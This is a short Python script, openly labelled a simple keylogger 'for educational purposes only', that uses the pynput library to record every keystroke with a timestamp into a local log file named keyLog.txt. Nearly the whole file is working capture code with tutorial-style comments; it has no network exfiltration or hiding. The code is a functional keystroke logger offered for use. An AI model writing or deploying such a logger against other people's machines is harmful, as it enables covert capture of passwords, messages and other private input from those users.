"""
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Author: Yaser Kassem

This is a simple keylogger program, this was made 
for educational purposes only!
hello
This is to show that even small code software have
great power
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
"""

# Before we start writting the code we must import the following tools in order to be able to perform our keylogigng
import pynput
import logging
from pynput.keyboard import Key, Listener

# Here you can add the directory you wish to save your log file 
log_dir = r"C:/Your/Wished/Directory"

# This log file will have all the keystrokes with the time it was typed, in the format as given below (TIME:MESSAGE)
logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# In this function it will take each key as a parameter, then this information will
# be logged in the "keyLog.txt"
def on_press(key):
    logging.info(str(key))

# Creating a listener instance and define the on-press method and join it
# with the main program thread
with Listener(on_press=on_press) as listener:
    listener.join()
